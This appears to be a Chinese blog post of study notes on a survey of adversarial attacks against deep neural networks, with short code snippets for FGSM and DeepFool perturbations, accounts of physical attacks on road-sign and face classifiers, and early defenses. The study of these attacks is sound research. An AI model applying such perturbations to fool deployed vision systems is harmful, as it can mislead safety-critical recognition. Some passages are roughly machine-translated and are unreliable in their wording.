最终训练结果，损失值稳定在0.015左右，准确度为70% 左右； 1model.summary() 由于数据是随机生成的，我们取1号举例，可以看到标签是0，结果也是很接近1的 1234567891011import numpy as npx1 = x[1]y1 = y[1]x1 = np.expand_dims(x1,axis=0)y1_predict = model.predict(x1)print(y1)print(y1_predict)Out:0[[0.15540801]] 根据公式： η=ϵsign⁡(grad⁡(w,x,y))&quot;\\eta=\\operatorname{\\epsilon sign}(\\operatorname{grad}(w, x, y))&quot;η=ϵsign(grad(w,x,y))&quot; 我们知道下一步需要计算：模型在x1处的梯度： 12345x1 = tf.convert_to_tensor(x1)with tf.GradientTape(persistent=True) as g: g.watch(x1) y = model(x1)gradient = g.gradient(y, x1) 接下来跟着公式进行计算即可： e我们取0.1 可以认为对原来改变的很小 1234e = 0.1n = np.sign(gradient)x_ = x1 + n * eprint(model(x_)) 可以看到预测的结果完全变了！ ¶Basic &amp; Least-Likely-Class Iterative Methods one step方法通过在的方向上迈出一大步（即一步梯度上升）增加分类器的损失来扰动图像。这个想法的一个直观扩展是迭代地采取多个小步骤同时调整每一步后的方向。基本迭代法（BIM）[35]正是这样做的，并且迭代计算如下： Iρi+1=Clip⁡ϵ{Iρi+αsign⁡(∇J(θ,Iρi,ℓ)}&quot;\\mathbf{I}_{\\rho}^{i+1}=\\operatorname{Clip}_{\\epsilon}\\left\\{\\mathbf{I}_{\\rho}^{i}+\\alpha \\operatorname{sign}\\left(\\nabla \\mathcal{J}\\left(\\boldsymbol{\\theta}, \\mathbf{I}_{\\rho}^{i}, \\ell\\right)\\right\\}\\right.&quot;Iρi+1​=Clipϵ​{Iρi​+αsign(∇J(θ,Iρi​,ℓ)}&quot; Iρi&quot;\\mathbf{I}_{\\rho}^{i}&quot;Iρi​&quot;表示第i次迭代时的扰动图像，Clip 就是剪掉变化过大的部分； BIM算法从ℓ∞&quot;\\ell_{\\infty}&quot;ℓ∞​&quot;版本，PGD是一种标准的凸优化方法。 与将FGSM扩展到 “一步目标类” 变体类似（通过迭代的方式使得图像的识别趋近于某一个类别），Kurakin等人[35]也将BIM扩展到迭代最小可能类方法（ILCM）。在这种情况下，用分类器预测的最不可能类的目标标签l&quot;l&quot;l&quot;。 ILCM方法生成的对抗性示例已被证明严重影响了分类的精度，即使ε的值非常小，例如&lt;16。 ILCM的实现过程可以说与FGSM如出一辙，区别就在于迭代的次数和诱导分类器预测的目标标签不同； ¶3.1.4 Jacobian-based Saliency Map Attack (JSMA) 目前通过限制l0&quot;l_0&quot;l0​&quot;范数来制造对抗性攻击。这意味着目标是只修改图像中的几个像素，而不是干扰整个图像来欺骗分类器。他们生成所需对抗图像的算法关键如下: 该算法一次修改一个干净图像的像素，并监控变化对结果分类的影响。 通过使用网络层的输出的梯度计算显著性图(computing a saliency map)来执行监视。 在map中，较大的值表示可以成功愚弄网络将l&quot;l&quot;l&quot;的可能性较高。一旦map被计算出来，算法就会选择最有效的像素来欺骗网络并改变它。重复这个过程，直到敌对图像中允许的最大像素数被改变，或者愚弄成功。 ¶3.1.5 One Pixel Attack 对抗攻击的一个极端情况是，只改变图像中的一个像素以欺骗分类器。有趣的是，Su等人[68]声称，在70.97%的测试图像上，通过改变每幅图像的一个像素，成功地愚弄了三种不同的网络模型。他们还报告说，网络对错误标签的平均置信度为97.47%。 Su等人利用（Differential Evolution）差异进化的概念计算了对抗性例子[148]。对于一个干净的图像，他们首先在R5&quot;\\mathbb{R}^{5}&quot;R5&quot;中创建了一组400个向量，使得每个向量包含xy坐标；然后给这些向量随机的RGB。 然后，他们随机修改向量的元素来创建子对象，使得子对象在下一次迭代中与其父对象竞争适应度（fitness criterion），同时使用网络的概率预测标签作为适应度准则。最后幸存的子对象用于改变图像中的像素。 即使这样一个简单的进化策略，Su等人[68]也能成功地愚弄了深层网络。注意，差分进化使他们的方法能够产生对抗性的例子，而不需要获得任何关于网络参数值或其梯度的信息。他们的技术需要的唯一输入是目标模型预测的概率标签。让就是说这种攻击的方法属于黑盒攻击； ¶3.1.6 Carlini and Wagner Attacks (C&amp;W) 卡里尼和瓦格纳[36]提出了一系列的三次对抗性攻击，这是在对抗性干扰[38]的防御升华之后提出的。这些攻击通过限制扰动的ℓ0&quot;\\ell_{0}&quot;ℓ0​&quot;范数使扰动具有准不可察觉性，并且证明了针对目标网络的防御蒸馏几乎完全不能抵抗这些攻击。此外，本文还证明了利用不安全（未蒸馏）网络生成的对抗性例子可以很好地转移到安全（蒸馏）网络，这使得计算出的扰动适合于黑盒攻击。 然而更常见的是利用对抗性例子的可转移性来生成黑盒攻击，Chen等人[41]还提出了基于“零阶优化（ZOO）”的攻击，直接估计目标模型的梯度来生成对抗性例子。这些攻击的灵感来自C&amp;W攻击。 补充说明：C&amp;W攻击 ¶3.1.7 DeepFool Moosavi-dezfouli等人[72]提出了一个迭代计算最小范数对抗性扰动的方法。DeepFool用干净的图像初始化，该图像被假定位于由分类器的决策边界限定的区域中。这个区域决定了图像的类标签。At each iteration, the algorithm perturbs the image by a small vector that is computed to take the resulting image to the boundary of the polyhydron that is obtained by linearizing the boundaries of the region within which the image resides.每次迭代中添加到图像上的扰动被累加，一旦扰动图像根据网络的原始决策界改变其标签，就计算出最终的扰动。作者证明了DeepFool算法能够计算出比FGSM[23]计算的扰动范数更小的扰动，同时具有相似的愚弄率。 实现过程与FGSM也是比较类似的； 下面我们看一下Deep Fool算法和FGSM算法去攻击同一个图像修改量的对比图： 可以看到Deep Fool的修改量明显的要小于FGSM； 除了迭代环节，DeepFool与FGSM的算法完全相同。在迭代环节，我们可以通过NumPy的inalg.norm函数对梯度进行处理，然后迭代更新图片内容。 1234567891011121314151617# Deep Fool 攻击代码的迭代while cost &lt; 0.6: cost,gradients = grab_cost_and_gradients_from_model([hacked_image,0]) r= gradients*cost/pow(np.linalg.norm(gradients), 2) hacked_image +=r hacked_image = np.clip(hacked_image, max_change_below, max_change_above) hacked_image = np.clip(hacked_image, -1.0, 1.0) # FGSM算法的迭代while cost &lt; 0.60: cost, gradients = grab_cost_and_gradients_from_model([hacked_image, 0]) n=np.sign(gradients) hacked_image +=n*e hacked_image = np.clip(hacked_image, max_change_below, max_change_above) hacked_image = np.clip(hacked_image, -1.0, 1.0) ¶3.1.8 Universal Adversarial Perturbations ​ 然而像FGSM[23]、ILCM[35]、Deep-Fool[72]等方法计算扰动来愚弄单个图像上的网络，Moosavi Dezfouli等人[16]计算的“普遍”对抗扰动能够以高概率愚弄“任何”网络。如图1所示，这些图像不可知的扰动对于人类视觉系统来说仍然是准不可察觉的。为了正式定义这些扰动，让我们假设干净的图像是从分布ℑc&quot;\\Im_{c}&quot;ℑc​&quot;采样的。如果扰动ρ满足以下约束条件，则它是“普适的”： PIc∼ℑc(C(Ic)≠C(Ic+ρ))≥δ s.t. ∥ρ∥p≤ξ&quot;\\underset{\\mathbf{I}_{c} \\sim \\Im_{c}}{\\mathrm{P}}\\left(\\mathcal{C}\\left(\\mathbf{I}_{c}\\right) \\neq \\mathcal{C}\\left(\\mathbf{I}_{c}+\\boldsymbol{\\rho}\\right)\\right) \\geq \\delta \\text { s.t. }\\|\\boldsymbol{\\rho}\\|_{p} \\leq \\xi&quot;Ic​∼ℑc​P​(C(Ic​)​=C(Ic​+ρ))≥δ s.t. ∥ρ∥p​≤ξ&quot; 其中(δ,ξ)&quot;(\\delta, \\xi)&quot;(δ,ξ)&quot; -universal ，因为它们对上述参数有很强的依赖性。然而，这些扰动在文献中通常被称为普遍的对抗性扰动（universal adversarial pertur- bations）。 作者通过限制 ℓp&quot;\\ell_{p}&quot;ℓp​&quot;球，在所有图像上计算的扰动被逐渐累积。 Moosavi Dezfouli等人[16]提出的算法在针对单个网络模型时计算扰动，例如ResNet[147]。这些扰动也可以很好地推广到不同的网络（特别是具有相似结构的网络）。从这个意义上说，作者声称扰动在某种程度上是“双重普遍的”。此外，高愚弄率只使用大约2000张训练图像来学习扰动就可以实现了。 Khrulkov等人[190]还提出了一种将普遍对抗性扰动构造为网络特征映射的雅可比矩阵奇异向量的方法，这种方法允许仅使用少量图像获得相对较高的欺骗率。另一种产生普遍扰动的方法是Mopuri等人[135]提出的快速特征愚弄。他们的方法产生了与数据无关的普遍扰动。 ¶3.1.9 UPSET and ANGRI ​ Sarkar等人[146]提出了两种黑盒攻击算法，即 UPSET: Universal Perturbations for Steering to Exact Targets, 和ANGRI: Antagonistic Network for Generating Rogue Images 有针对性地愚弄深层神经网络。对于“n”类，UPSET寻求产生“n”图像不可知扰动，这样当扰动被添加到不属于目标类的图像时，分类器将扰动图像分类为来自该类。UPSET的效果来自一个residual generating network R(t)&quot;\\mathrm{R}(\\mathrm{t})&quot;R(t)&quot; 以供愚弄。整体方法使用所谓的UPSET- network解决以下优化问题： Iρ=max⁡(min⁡(sR(t)+Ic,1),−1)&quot;\\mathbf{I}_{\\boldsymbol{\\rho}}=\\max \\left(\\min \\left(s \\mathbf{R}(\\mathbf{t})+\\mathbf{I}_{c}, 1\\right),-1\\right)&quot;Iρ​=max(min(sR(t)+Ic​,1),−1)&quot; 其中，s′&quot;s^{\\prime}&quot;s′&quot;是标量. 为确保为有效图像，将剪裁间隔[-1,1]之外的所有值。与图像不可知的UPSET相比，ANGRI以一种密切相关的方式计算图像特定的扰动. ANGRI产生的扰动也被用于有针对性的愚弄。据报道，这两种算法在MNIST[10]和CIFAR-10[152]数据集上都实现了高愚弄率。每一种算法的具体实现我会在接下来的其他文章中逐个进行介绍； ¶3.1.10 Houdini ​ Cisse等人[131]提出了“Houdini”，这是一种通过生成对抗性的例子来愚弄 “基于梯度学习的算法”。对抗性例子可以根据任务损失进行调整。产生对抗性例子的典型算法采用网络可微损失函数的梯度来计算扰动。然而，任务损失通常不适合这种方法。例如，语音识别的任务损失是基于字错误率的，这不允许直接利用损失函数梯度。Houdini是专门为此类任务生成对抗性示例的。除了可以成功生成攻击分类算法的敌对图像外，Houdini还被证明成功攻击了流行的自动语音识别系统[151]. 作者还通过在黑盒攻击场景中愚弄google voice，证明了语音识别中攻击的可转移性。此外，成功的目标攻击和非目标攻击也证明了深度学习模型的人体姿态估计。 ¶3.1.11 Adversarial Transformation Networks (ATNs) ​ Baluja和Fischer[42]训练了前馈神经网络（feed-forward neural net- works），用于生成对抗其他目标网络或网络集的对抗性示例。训练网络就叫做Adversarial Transformation Networks (ATNs). 通过最小化由两部分组成的联合损失函数，计算了这些网络产生的对抗性例子; 第一部分限制对抗示例与原始图像具有感知相似性，而第二部分旨在改变目标网络对结果图像的预测。 沿着相同的方向，Hayex和Danezis[47]还使用attacker neural network 来学习黑匣子攻击的对抗性例子。在给出的结果中，attacker neural network计算的示例与干净的图像在本质上不可区分，但它们被目标网络以压倒性的概率错误分类-在MNIST数据[10]上将分类精度从99.4%降低到0.77%，在CIFAR-10数据集[152]上将分类精度从91.4%降低到6.8%。 ¶3.1.12 Miscellaneous Attacks 这里论文里列举的实在太多了，就以论文中的表格来概括吧； 表格中4星以上的攻击方法，之后应该都会出专门的文章进行学习和介绍的，也包括学习过程中的代码实现； ¶3.2 Attacks beyond classification/recognition ​ 除了Houdini[131]之外，第3.1节中回顾的所有主流攻击都直接集中在分类任务上——通常愚弄基于CNN的分类网络[10]。然而，由于对抗性威胁的严重性，除了计算机视觉中的分类/识别任务外，攻击也被积极地研究。接下来让我们回顾深层神经网络攻击分类之外算法的工作。 ¶3.2.1 Attacks on Autoencoders and Generative Models Tabacof等人[128]研究了针对autoencoders的对抗性攻击[154]，并提出了一种扭曲输入图像（使其具有对抗性）的技术，这种技术会误导自动编码器重建完全不同的图像。他们的方法攻击神经网络的内部特征，使得攻击图像的特征与目标图像的特征相似。 然而，据[128]报道，与典型的分类器网络相比，自动编码器似乎对对抗性攻击更具鲁棒性。Kos等人[121]还探索了计算深层生成模型的高级示例的方法，例如变分自动编码器（VAE）和VAE生成对抗网络（VAE-GANs） GAN 像[153]这样的现在在计算机视觉领域非常流行，应用程序可以学习数据分布并生成真实的图像. 作者介绍了针对VAE和VAE-GANs的三种不同类型的攻击。由于这些攻击的成功，我们可以得出结论，深层生成模型也能够攻击,这些攻击会使得输入转化为非常不同的输出。这项工作进一步支持了“ 对抗性例子是当前神经网络结构的普遍现象”这一假设。也就是说当前神经网络普遍会受到对抗性例子的影响； ¶3.2.2 Attack on Recurrent Neural Networks ​ Papernot等人[110]成功地为递归神经网络（RNN）生成了对抗性输入序列。RNN是一种深度学习模型，特别适合学习顺序输入和输出之间的映射[155]。Papernot等人证明，为前向神经网络（如FGSM[23]）计算对抗性示例的算法也可用于欺骗RNN。特别是，作者成功地愚弄了流行的长短时记忆（LSTM）RNN架构[156]。结论是，循环神经网络模型（如RNN）也不能免疫非循环神经网络（即CNN）中最初发现的对抗性扰动. ¶3.2.3 Attacks on Deep Reinforcement Learning Lin等人[134]提出了两种不同的对抗性攻击，专门用于深度强化学习[157]。第一种攻击，被称为“策略定时攻击”，对手通过在一个事件中的一小部分的时间内进行攻击来使得agent的奖励值最小化。这提出了一种确定何时制作和应用对抗性示例的方法，使攻击不被发现。在第二种攻击中，称为‘enchanting attack’（附魔攻击），对手通过集成生成模型和规划算法将agent（智能体）引诱到指定的目标状态。生成模型用于预测agent的未来状态，而规划算法用于生成引诱agent的行为。针对由最先进的深度强化学习算法[157]、[158]训练的代理，成功地测试了这些攻击。 在另一项研究中，Huang等人[62]证明，FGSM[23]也可用于在深度强化学习的背景下显著降低模型的准确度。 ¶3.2.4 Attacks on Semantic Segmentation and Object De- tection 在Moosavi Dezfouli[16]的启发下，Metzen等人[67]证明了图像不可知伦中准不可察觉pertur-bations的存在，这种pertur-bations可以欺骗深层神经网络，显著破坏图像的预测分割。此外，他们还表明，可以计算噪声向量，在保持大部分图像分割不变的情况下（例如，从道路场景中移除行人），从分割的类中移除特定的类。 虽然有人认为“用于语义图像分割的高级扰动空间可能比图像分类的小”，但这种扰动对于不可见的验证图像具有很高的概率去推广。Arnab等人[51]还评估了基于FGSM[23]的用于语义分割的对抗性攻击，并指出许多关于这些用于分类的攻击的观察结果并没有直接转移到分割任务。 Xie等人[115]计算了用于语义分割和目标检测的对抗性示例，观察到这些任务可以表示为对图像中的多个目标进行分类-目标是分割中的一个像素或一个感受野，以及检测中的目标建议。 在这种观点下，他们的方法称为“密集敌方生成”（Dense Adversary Generation），它优化了一组像素/方案上的损失函数，以生成敌方示例。生成的例子被测试来愚弄各种基于深度学习的分割和检测方法。他们的实验评估不仅成功地愚弄了目标网络，而且还表明所产生的扰动在不同的网络模型中具有良好的通用性。在下图中，展示了使用[115]中的方法进行分割和检测的网络欺骗的代表性示例。 ¶4. ATTACKS IN THE REAL WORLD ¶4.0.1 Attacks on Face Attributes 人脸属性是现代安全系统中新兴的软生物特征识别技术之一。虽然人脸属性识别也可以被归类为一个分类问题，但由于人脸识别本身被视为计算机视觉中的一个主流问题，因此我们分别回顾了这方面的一些有趣的攻击。 Rozsa等人[130]，[160]利用CelebA基准[161]探索了多种深度学习方法的稳定性，通过生成对抗性的例子来改变人脸识别的结果；看下图： 通过使用所谓的“快速翻转属性”技术攻击深度网络分类器，他们发现深度神经网络对对手攻击的鲁棒性在不同的面部属性之间存在很大差异。对抗性攻击可以有效地将目标属性的标签转换为相关属性。 Shen等人[144]提出了两种不同的技术来生成具有高“吸引力分数”但“主观分数”较低的人脸的对抗性示例，用于使用深度神经网络进行人脸吸引力评估。有关人脸识别任务的进一步攻击，请参阅[185]。第3节回顾的文献假设对手直接用图像扰动反馈深层神经网络。此外，还使用标准图像数据库评估了攻击的有效性。尽管这些设置已经证明足以说服许多研究人员，对抗性攻击是实践中深入学习的真正关注点，但我们在文献中也遇到了一些实例（例如[48]，[30]）这种担忧被轻描淡写，对抗性的例子被认为“只是好奇的问题”，几乎没有实际的担忧。因此，本节专门介绍在实际情况下处理对抗性攻击的文献，以帮助解决争论 ¶4.1 Cell-phone camera attack Kurakin等人[35]首先证明了防御攻击的威胁也存在于物理世界中。为了说明这一点，他们打印了敌对的图像，并用手机摄像头拍下了照片。这些图像被输入到Tensor-Flow相机演示应用程序[181]，该应用程序使用谷歌的Inception模型[145]进行对象分类。结果表明，即使通过相机观察，也有很大一部分图像被错误分类。在图6中，示出了原稿的示例。 以下网址还提供了一段视频[https://youtu.be/zQ uMenoBCk ](https://youtu.be/zQ uMenoBCk )显示了进一步的图像敌对攻击的威胁。这项工作研究了FGSM[23]、BIM和ILCM[35]在物理世界中的攻击方法。 ¶4.2 Road sign attack ​ Etimov等人[75]在[36]和[88]中提出的攻击的基础上，设计了物理世界的鲁棒扰动。他们证明了强大的物理条件，如在视角，距离和分辨率的变化是攻击的可能性。他们提出的算法称为RP2鲁棒物理扰动，用于生成对抗性的例子，道路标志识别系统。这个算法实现了高愚弄率在实际驾车设置。在这项工作中，针对物理路标引入了两种攻击类别：（a）海报打印：攻击者打印一张受到干扰的路标海报，并将其放置在真实的路标上（见下图）（b） 贴纸扰动：印刷在纸上，纸贴在真正的标志上。对于（b）两种类型的扰动进行了研究，（b1）细微扰动：占据整个标志，（b2）伪装扰动：标志上的涂鸦贴纸形式。因此，所有这些干扰都只需要彩色打印机，而不需要其他特殊硬件。成功地产生了（a）和（b）的扰动，使得扰动对物理世界中的自然变化保持鲁棒性，这表明了现实世界中敌对例子的威胁。 ​ Lu等人[30]之前曾声称，由于移动车辆中的物理条件不断变化，对抗性示例对于自动车辆中的目标检测不是一个问题。然而，他们所采用的攻击方法[22]、[23]、[35]有些原始。Etimov等人[75]的发现与[66]中的结果正交。然而，在后续研究中，Lu等人[19]表明，像YOLO 9000[149]和FasterrRcnn[150]这样的探测器“目前”没有被Etimov等人[75]引入的攻击所欺骗。在后续研究中，Lu等人[19]表明，像YOLO 9000[149]和Faster rRcnn[150]这样的探测器“目前”没有被Etimov等人[75]引入的攻击所欺骗。Zeng等人[87]还认为，图像空间中的对抗性扰动在物理空间中并不能很好地推广; 然而，Athalye等人[65]表明，我们实际上可以打印3D物体，以便在物理世界中进行成功的对抗性攻击。我们在第4.3节讨论[65]。 ​ Gu等人[33]还探讨了一个有趣的概念，神经网络外包训练面临的威胁。他们表明，有可能训练一个在用户的训练和验证样本上表现出最先进性能，但在攻击者选择的输入上表现糟糕的网络（BadNet）。他们在真实场景中演示了这种攻击，创建了一个街道标志分类器，当在停车标志上添加特殊标签时，该分类器将停车标志识别为限速标志。此外，研究发现，即使网络后来用额外的训练数据进行了微调，网络的愚弄行为仍然在合理的程度上存在。 ¶4.3 Generic adversarial 3D objects Athalye等人[65]介绍了一种构建3D对象的方法，这种方法可以在各种角度和视点上愚弄神经网络。他们的“对变换的期望”（EOT）框架能够构建对整个图像/对象变换分布具有对抗性的示例。他们的端到端方法能够打印任意对抗性的3D对象。在我们看来，这项工作的结果确定，对抗性攻击是一个真正的关注在物理世界的深入学习。图8展示了一个3D打印海龟的例子，它被EOT框架修改为步枪。以下网址提供了演示物理世界中被EOT愚弄的视频：https://www.youtube.com/watch?v=YXy6oX1iNoA&amp;feature=youtu.be ¶4.4 Cyberspace attacks Papernot等人[39]在现实世界中对网络空间中的深层神经网络分类器发起了第一次攻击。他们在合成数据上训练了一个替代网络来代替目标黑盒分类器，并举例说明了MetaMind、Amazon和Google对远程托管神经网络的攻击。他们能够证明各自的目标网络错误地分类了84.24%，96.19%和88.94%的由他们的方法产生的对抗性例子。实际上，攻击者在其威胁模型中唯一可用的信息是目标网络的输出标签，用于攻击者提供的输入图像。 在一项相关的工作中，Liu等人[88]开发了一种基于集合的攻击，并展示了它对攻击的成功。 Grosse等人[61]展示了为用作恶意软件分类工具的神经网络构建有效的通用攻击。与图像识别相比，恶意软件分类领域在对抗性设置中引入了额外的约束，如用离散输入代替连续输入域，用要求等价功能行为代替视觉相似性条件。然而，Grosse等人[61]表明，创建有效的对抗性示例对于恶意软件分类仍然是可能的。在[64]、[107]、[125]中还可以找到针对基于深度学习的恶意软件分类的成功对手攻击的更多示例。 ¶5 EXISTENCE OF ADVERSARIAL EXAMPLES ​ 在有关计算机视觉深度学习中的对抗性攻击的文献中，关于对抗性例子存在着不同的观点。这些观点通常与研究人员在攻击或防御深层神经网络时所做的局部经验观察很好地吻合。然而，它们在普及性方面往往不够。例如，Goodfello等人[23]流行的线性假设很好地解释了FGSM和相关攻击。然而，Tanay和Griffin[74]证明了线性分类器的图像类不会受到敌对示例的影响，这与线性假设不一致。更不用说，线性假设本身与先前流行的观点有很大的偏差. 对抗性的例子来源于深度神经网络引起的高度非线性的决策边界。文献中也有其他例子，其中线性假设没有得到直接支持[119]。 ​ 决策边界的平坦性[69]、决策边界的大局部曲线[70]和网络的低灵活性[71]是关于存在相互不完全一致的对抗性例子的观点的例子。很明显，只需修改图像中的一个像素就可以形成对抗性示例，但目前的文献似乎对存在对抗性示例的原因缺乏共识。这一事实也使得对抗性例子的分析成为一个积极的研究方向，有望探索和解释由深度神经网络（目前更普遍地被视为黑盒模型）所诱导的决策边界的性质。下面，我们回顾了主要集中在分析对抗性扰动的存在性以进行深入学习的工作。我们注意到，除了下面回顾的文献外，与对抗性攻击（第3节）和防御（第6节）相关的工作通常提供对抗性扰动的简要分析，同时推测导致存在对抗性例子的现象。 ¶5.1 Limits on adversarial robustness ​ Fawzi等人[118]提出了一个研究分类器对 对抗性扰动不稳定性的框架。他们根据数据集类别之间的“可分辨性度量”建立了分类器鲁棒性的基本限制，其中可分辨性定义为线性分类器的两个类别平均值之间的距离和所研究非线性模型的二阶矩矩阵之间的距离分类器。这项工作表明，对抗性的例子也存在于深层神经网络以外的分类中。本文的分析将对抗性不稳定性的现象追溯到分类器的低灵活性，这与当时的主流观点不完全正交，即网络的高非线性使它们容易受到对抗性例子的影响。 ¶5.2 Space of adversarial examples ​ Tabacof和Eduardo[25]在MNIST[10]和ImageNet[11]数据集上生成了浅层和深层网络分类器的对抗性示例，并利用不同分布和强度的噪声探测对抗性示例的像素空间。作者经验性地证明了对抗性例子出现在像素空间的大区域中，这与[23]中的类似主张是一致的。然而，在某种程度上与线性假设相反，他们认为一个弱的、浅的和更线性的分类器也像一个强的深分类器一样容易受到敌对例子的影响。 ​ Tramer等人[132]提出了一种估计对抗性例子空间维数的方法。据称，对抗性的例子跨越一个相邻的高维空间（例如，维度≈25）。由于高维性，不同分类器的子空间可以相交，从而导致对抗性例子的可转移性。有趣的是，他们的分析表明，即使分类器容易受到直接攻击，也有可能防御基于传输的攻击。 ¶5.3 Boundary tilting perspective ​ Tanay和Griffin[74]对深层神经网络中存在的对抗性例子提出了“边界倾斜”的观点。他们认为，为了学习和评估分类器而采样的单个类数据通常存在于该类的子流形中，并且当分类边界接近该子流形时，该类存在对抗性示例。他们将分类器的“对抗强度”概念形式化，并将其简化为所考虑的分类器边界和最近的质心分类器之间的“偏离角”。然后证明了分类器的对抗强度可以通过“边界倾斜”决策来改变。作者还认为分类器的对抗稳定性与其正则化有关。在Tanay和Griffin看来，关于存在对抗性例子的线性假设[23]是“不可信的”。 ¶5.4 training cause adversaries预测的不确定性与进化停滞 ​ Cubuk等人[91]认为，“对抗性测试的起源主要是由于神经网络对其预测的固有不确定性”。他们根据经验计算了不确定性的函数形式，这与网络结构、训练协议和数据集无关。有人认为，这种形式只依赖于统计的网络逻辑差异。这最终会导致敌对攻击导致的欺骗比率，从而显示出相对于扰动大小的通用缩放。他们研究了基于FGSM[23]、ILCM和BIM[35]的攻击来证实他们的说法。它还声称，网络在清晰图像上的准确性与其对抗性的健壮性相关（关于这个方向的更多论据，见第5.5节）。 ​ Rozsa等人[102]假设对抗性干扰的存在是训练图像上决策边界进化停滞的结果。他们认为，一旦分类正确，单个训练样本就不会导致模型（即神经网络）的训练损失，这最终会使它们接近决策边界。因此，通过添加微小的扰动，就有可能将这些（和类似的）样本丢弃到错误的类区域。他们提出了一种批量调整网络梯度（BANG）算法来训练网络，以缓解训练过程中的进化停滞。 ¶5.5 Accuracy-adversarial robustness correlation ​ 为了解释对抗性攻击的存在，Rozsa等人[97]实证分析了八个深度网络分类器的准确度与其对[23]、[94]中介绍的三种对抗性攻击的鲁棒性之间的关系。所研究的分类器包括AlexNet[9]、VGG-16和VGG-19网络[163]、伯克利训练的GoogLeNet和普林斯顿GoogLeNet版本[18]、ResNet-52、ResNet-101和ResNet-152[147]。使用[23]和[94]中提出的技术，借助大型ImageNet数据集[11]生成对抗性示例。他们的实验结果表明，分类精度较高的网络通常对敌方实例也表现出较强的鲁棒性。他们还得出结论，对抗性的例子在相似的网络拓扑之间传输得更好。 ¶5.6 More on linearity as the source ​ Kortov和Hopfield[127]在稠密联想记忆（DAM）模型的背景下检验了普遍扰动的存在[164]。与典型的现代深层神经网络相比，DAM模型采用了神经元之间更高阶（多于二次）的相互作用。作者已经证明，使用具有较小交互功率的DAM模型生成的对抗性测试无法愚弄具有高阶交互的模型，这类似于使用具有ReLU激活的深层神经网络来诱导线性[165]。作者提供了独立于FGSM[23]攻击的对抗性例子存在的经验证据，但支持Goodfello等人[23]的线性假设。 ¶5.7 Existence of universal perturbations ​ Moosavi-Dezfouli等人[16]最初认为，普遍对抗性扰动利用了分类器诱导的决策边界之间的几何相关性。它们的存在部分归功于包含决策边界的nor-mals的子空间，使得法线也围绕着自然图像。在[70]中，他们进一步建立了他们的理论，并证明了存在共同的方向（在数据点之间共享），沿着这些方向，分类器的决策边界可以高度正弯曲。他们认为这样的方向在宇宙扰动的存在中起着关键作用。基于他们的发现，作者还提出了一种新的几何方法来有效地计算普遍对抗摄动。 值得注意的是，先前Fawzi等人[69]也将分类器鲁棒性的理论界与决策边界的曲率联系起来。同样，Tramer等人[77]也认为，数据点附近决策边界的曲率是神经网络易受黑盒攻击的原因。在最近的另一项工作中，Mopuri等人[193]提出了一个类GAN模型来研究给定目标模型的普遍对抗扰动的分布。学习的分布也显示出良好的跨模型传递性。 ¶6 DEFENSES AGAINST ADVERSARIAL ATTACKS 目前，对抗性攻击的防御主要沿着三个方向发展： 1） 在学习过程中使用修改过的训练方式或在测试过程中使用修改过的输入。 2） 修改网络，例如通过添加更多层/子网络、更改丢失/激活功能等。 3） 当分类筛选看不见的示例时，使用外部模型作为网络附加组件。 ​ 第一个方法不直接处理学习模型。其他两类更关注神经网络本身。这两类技术又可分为两类，即完全防御和仅检测。“完全防御”方法旨在使目标网络能够在对抗性示例上实现其原始目标，例如，分类器以可接受的精度预测对抗性示例进行预测。另一方面，“仅检测”方法意味着对潜在的对抗性示例发出危险信号，以便在任何进一步处理中拒绝它们。所描述的类别的分类也示于下图中。剩下的部分是根据这个分类法组织的。在所使用的分类法中，“修改”网络和使用“附加组件”的区别在于前者在训练期间对原始的深层神经网络结构/参数进行了更改。另一方面，后者保持原始模型的完整性，并在测试过程中附加外部模型； ¶6.1 Modified training/input ¶6.1.1 Brute-force adversarial training【”蛮力对抗训练“】 ​ 自从发现深层神经网络的对抗性例子[22]以来，相关文献中有一个普遍的共识，即神经网络对这些例子的鲁棒性随着对抗性训练而提高。因此，引入新的对抗性攻击的大多数贡献，例如[22]、[23]、[72]（见第3节）同时提出了对抗性训练作为抵御这些攻击的第一道防线。尽管对抗性训练提高了网络的健壮性，但要想真正有效，它需要使用强攻击进行训练，并且网络的体系结构具有足够的表现力。由于对抗性训练需要增加训练/数据量，我们称之为“暴力的“策略。 ​ 文献中还普遍观察到，暴力对抗训练可使网络正规化（例如，见[23]，[90]），以减少过拟合，进而提高网络抵抗对抗攻击的鲁棒性。受此启发，Miyato等人[113]提出了一种“虚拟对抗训练”方法来平滑神经网络的输出分布。Zheng等人[116]还提出了一种相关的“稳定性训练”方法，以提高神经网络对输入图像小失真的鲁棒性。值得注意的是，尽管对抗性训练可以提高神经网络的鲁棒性，但Moosavi Dezfouli[16]表明，**对于已经经过对抗性训练的网络，可以再次计算有效的对抗性例子。**从这里就可以看出暴力对抗并不是一种很好的方法； ¶6.1.2 Data compression as defense 【数据压缩防御】 ​ Dziugaite等人[123]指出，大多数流行的图像分类数据集都包含JPG图像。基于这一观察，他们研究了JPG压缩对FGSM计算的扰动的影响[23]。据报道，JPG压缩实际上可以在很大程度上扭转FGSM扰动导致的分类精度下降。然而，我们得出结论，单靠压缩是远远不能有效防御的。Guo等人也对JPEG压缩进行了研究。郭等人[82]也对JPEG压缩进行了研究，以降低对抗性图像的有效性。Das等人[37]也采取了类似的方法，使用JPEG压缩来去除图像中的高频成分，并提出了一种基于集合的技术来对抗FGSM[23]和DeepFool方法[72]产生的敌对攻击。尽管[37]中报告了令人鼓舞的结果，但没有对更强的攻击进行分析。e.g. C&amp;W攻击[36]。此外，Shin和Song[186]已经证明了存在能够在JPEG压缩中幸存的对抗性示例。在我们之前的工作[81]中，我们还发现离散余弦变换（DCT）下的压缩不足以抵御普遍扰动[16]。基于压缩的防御的一个主要限制是，较大的压缩也会导致对干净图像的分类精度损失，而较小的压缩通常不能充分消除对抗性扰动。 ​ 在另一个相关的方法中，Bhagoji等人[169]提出使用主成分分析来压缩输入数据，以增强对抗性。然而，Xu等人[140]指出，这种压缩也会破坏图像的空间结构，因此通常会对分类性能产生不利影响。 ¶6.1.3 Foveation based defense 【中心凹防御】 ​ Luo等人[119]证明，使用L-BFGS[22]和FGSM[23]的对抗性攻击具有显著的鲁棒性，通过在图像的不同区域应用神经网络的“中心凹”机制是可能的。假设基于CNN的分类器在大型数据集（如ImageNet[11]）上训练，通常对图像中对象的缩放和平移变化具有鲁棒性。然而，这种不变性并没有扩展到图像中的对抗模式。这使得中央凹成为一个可行的选择，以减少在[22]，[23]中提出的对抗性攻击的有效性。然而，中心凹还没有证明其有效性更强大的攻击。 ¶6.1.4 Data randomization and other methods 【数据随机化和其他方法】 ​ 